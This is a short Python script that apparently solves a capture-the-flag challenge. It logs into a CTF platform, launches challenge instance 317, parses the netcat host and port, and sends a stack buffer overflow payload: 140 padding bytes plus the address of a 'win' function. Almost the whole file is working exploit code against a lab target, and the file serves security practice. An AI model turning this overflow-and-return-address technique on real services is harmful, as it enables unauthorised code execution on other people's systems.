import sys, re, json, time, socket, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r"D:\ctf-index")
from cylab2 import CyLab

cy = CyLab(delay=0.5)
cy.login()
cy.req("PUT", "/api/challenges/317/instance/?source=library")
host = port = None
for _ in range(10):
    time.sleep(1)
    st, b = cy.req("GET", "/api/challenges/317/instance/")
    d = json.loads(b) if b.startswith("{") else {}
    m = re.search(r"nc\s+(-v\s+)?([A-Za-z0-9.\-]+)\s+(\d{2,5})", d.get("description") or "")
    if m:
        host, port = m.group(2), int(m.group(3))
        break
print("cible:", host, port)
WIN = 0x401528
s = socket.create_connection((host, port), timeout=12)
s.settimeout(5)
time.sleep(0.3)
try:
    s.recv(200)
except Exception:
    pass
payload = b"A" * 140 + struct.pack("<I", WIN)
s.sendall(payload + b"\n")
time.sleep(1.0)
out = b""
t0 = time.time()
while time.time() - t0 < 6:
    try:
        c = s.recv(8192)
        if not c:
            break
        out += c
    except socket.timeout:
        break
s.close()
txt = out.decode("latin-1", "replace")
print(txt[:1500])
